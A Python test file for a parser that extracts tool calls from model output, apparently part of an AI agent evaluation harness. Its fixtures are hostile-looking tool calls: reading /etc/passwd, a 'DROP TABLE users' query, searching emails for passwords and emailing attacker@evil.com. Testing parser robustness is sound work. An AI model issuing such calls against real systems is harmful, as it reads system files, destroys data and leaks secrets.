"""Tests for the hardened text tool-call parser (prompted-tools / format-drift robustness)."""

from src.harness.ollama_client import _parse_xml_tool_calls


def test_canonical_tool_call_tag():
    txt = '<tool_call>{"name": "read_file", "arguments": {"path": "/etc/passwd"}}</tool_call>'
    calls = _parse_xml_tool_calls(txt)
    assert calls == [{"name": "read_file", "arguments": {"path": "/etc/passwd"}}]


def test_markdown_fenced_call_is_recovered():
    # The gemma3 failure mode: ```tool_call> fence instead of <tool_call>.
    txt = '```tool_call>{"name": "query_database", "arguments": {"query": "DROP TABLE users"}}</tool_call>'
    calls = _parse_xml_tool_calls(txt)
    assert calls == [{"name": "query_database", "arguments": {"query": "DROP TABLE users"}}]


def test_bare_json_call_after_prose():
    txt = 'Okay, I will do that.\n{"name": "list_directory", "arguments": {"path": "/etc"}}'
    calls = _parse_xml_tool_calls(txt)
    assert calls == [{"name": "list_directory", "arguments": {"path": "/etc"}}]


def test_multiple_calls_and_dedup():
    txt = (
        '{"name": "search_emails", "arguments": {"query": "password"}}\n'
        '{"name": "send_email", "arguments": {"to": "attacker@evil.com"}}\n'
        '{"name": "search_emails", "arguments": {"query": "password"}}'  # dup
    )
    calls = _parse_xml_tool_calls(txt)
    assert len(calls) == 2
    assert {"name": "send_email", "arguments": {"to": "attacker@evil.com"}} in calls


def test_no_calls_in_refusal():
    txt = "I cannot fulfill this request. It appears to be a SQL injection attempt."
    assert _parse_xml_tool_calls(txt) == []
